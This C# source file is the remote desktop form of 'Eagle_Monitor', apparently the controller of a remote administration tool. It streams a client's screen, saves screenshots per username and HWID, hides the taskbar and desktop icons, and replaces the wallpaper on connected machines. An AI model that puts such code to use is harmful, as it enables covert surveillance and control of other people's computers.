using Eagle_Monitor.Clients;
using Eagle_Monitor.Controls;
using System;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor.Forms
{
    public partial class RemoteDesktopForm : FormPattern
    {
        public bool HasToCapture { get; set; }
        public bool HasToSendMouse { get; set; }
        public string ClientHWID { get; set; }
        public string IP_Origin { get; set; }
        public Size rdSize;
        public RemoteDesktopForm(string ClientHWID, string IP_Origin)
        {
            this.ClientHWID = ClientHWID;
            this.IP_Origin = IP_Origin;
            InitializeComponent();      
        }
        private void RemoteDesktopForm_Activated_1(object sender, EventArgs e)
        {
           /* HasToCapture = true;
            this.loadingCircle1.Visible = true;
            this.loadingCircle1.Active = true;
            Client C = Client.ClientDictionary[this.IP_Origin];
            Data D = new Data();
            D.Type = Shared.PacketType.PLUGIN;
            D.Plugin = Plugins.RemoteDesktop;
            D.IP_Origin = C.IP;
            D.HWID = C.HWID;
            D.Misc = new object[] { Shared.PacketType.REMOTE_VIEW, desktopPictureBox.Width, desktopPictureBox.Height, quailitySiticoneTrackBar.Value, formatComboBox.Text };
            Task.Run(() => C.SendData(D.Serialize()));*/
        }

        private void RemoteDesktopForm_Deactivate_1(object sender, EventArgs e)
        {
           // HasToCapture = false;
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            try
            {
                pictureBox1.Image = Eagle_Monitor.Properties.Resources.icons8_not_sending_video_frames_32;
                HasToCapture = false;
                this.Close();
            }
            catch { }
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void saveWindowsButton_Click(object sender, EventArgs e)
        {
            try
            {
                Client C = Client.ClientDictionary[this.IP_Origin];
                if (System.IO.Directory.Exists(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[this.IP_Origin].Username + "@" + this.ClientHWID + "\\" + "Screenshots") == false)
                    System.IO.Directory.CreateDirectory(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[this.IP_Origin].Username + "@" + this.ClientHWID + "\\" + "Screenshots");

                string Date = DateTime.UtcNow.DayOfYear.ToString() + DateTime.UtcNow.Hour.ToString() + DateTime.UtcNow.Minute.ToString() + DateTime.UtcNow.Second.ToString() + DateTime.UtcNow.Millisecond.ToString();

                System.IO.File.WriteAllBytes(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[this.IP_Origin].Username + "@" + this.ClientHWID + "\\Screenshots\\" + Date + "." + Client.ClientDictionary[this.IP_Origin].remoteDesktopForm.formatComboBox.Text.ToLower(), Utilities.ImageToBytes(Client.ClientDictionary[this.IP_Origin].remoteDesktopForm.desktopPictureBox.Image));
            }
            catch{ }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                pictureBox1.Image = Eagle_Monitor.Properties.Resources.icons8_showing_video_frames_32;
                HasToCapture = true;
                this.loadingCircle1.Visible = true;
                this.loadingCircle1.Active = true;
                Client C = Client.ClientDictionary[this.IP_Origin];
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.RemoteDesktop;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.REMOTE_VIEW, desktopPictureBox.Width, desktopPictureBox.Height, quailitySiticoneTrackBar.Value, formatComboBox.Text };
                Task.Run(() => C.SendData(D.Serialize()));
            }
            else 
            {
                pictureBox1.Image = Eagle_Monitor.Properties.Resources.icons8_not_sending_video_frames_32;
                HasToCapture = false;
            }
        }  
        private void RemoteDesktopForm_Load(object sender, EventArgs e)
        {
            ControlsDrawing.Enable(desktopPictureBox);

            foreach (ToolStripMenuItem I in remoteDesktopContextMenuStrip.Items)
            {
                I.BackColor = Color.White;
                I.ForeColor = Color.FromArgb(64, 64, 64);
            }
            remoteDesktopContextMenuStrip.Renderer = new ToolStripProfessionalRenderer(new ControlsDrawing.LightMenuColorTable());
        }

        private void hideToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client C = Client.ClientDictionary[this.IP_Origin];
            Data D = new Data();
            D.Type = Shared.PacketType.PLUGIN;
            D.Plugin = Plugins.Miscellaneous;
            D.IP_Origin = C.IP;
            D.DataReturn = C.HWID;
            D.DataReturn = new object[] { Shared.PacketType.HIDE_TB};
            Task.Run(() => C.SendData(D.Serialize()));
        }

        private void showToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client C = Client.ClientDictionary[this.IP_Origin];
            Data D = new Data();
            D.Type = Shared.PacketType.PLUGIN;
            D.Plugin = Plugins.Miscellaneous;
            D.IP_Origin = C.IP;
            D.HWID = C.HWID;
            D.DataReturn = new object[] { Shared.PacketType.SHOW_TB };
            Task.Run(() => C.SendData(D.Serialize()));
        }

        private void hideToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Client C = Client.ClientDictionary[this.IP_Origin];
            Data D = new Data();
            D.Type = Shared.PacketType.PLUGIN;
            D.Plugin = Plugins.Miscellaneous;
            D.IP_Origin = C.IP;
            D.HWID = C.HWID;
            D.DataReturn = new object[] { Shared.PacketType.HIDE_DI };
            Task.Run(() => C.SendData(D.Serialize()));
        }

        private void showToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Client C = Client.ClientDictionary[this.IP_Origin];
            Data D = new Data();
            D.Type = Shared.PacketType.PLUGIN;
            D.Plugin = Plugins.Miscellaneous;
            D.IP_Origin = C.IP;
            D.HWID = C.HWID;
            D.DataReturn = new object[] { Shared.PacketType.SHOW_DI };
            Task.Run(() => C.SendData(D.Serialize()));
        }

        private void changeWallPaperToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem I = new ListViewItem();

            using (OpenFileDialog o = new OpenFileDialog())
            {
                if (o.ShowDialog() == DialogResult.OK)
                {
                    byte[] file = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(o.FileName), 1);
                    Client C = Client.ClientDictionary[this.IP_Origin];
                    Data D = new Data();
                    D.Type = Shared.PacketType.PLUGIN;
                    D.Plugin = Plugins.Miscellaneous;
                    D.IP_Origin = C.IP;
                    D.HWID = C.HWID;
                    D.DataReturn = new object[] { Shared.PacketType.SET_DESK_WP, file , Path.GetExtension(o.FileName)};
                    Task.Run(() => C.SendData(D.Serialize()));
                }
            }
        }
    }
}
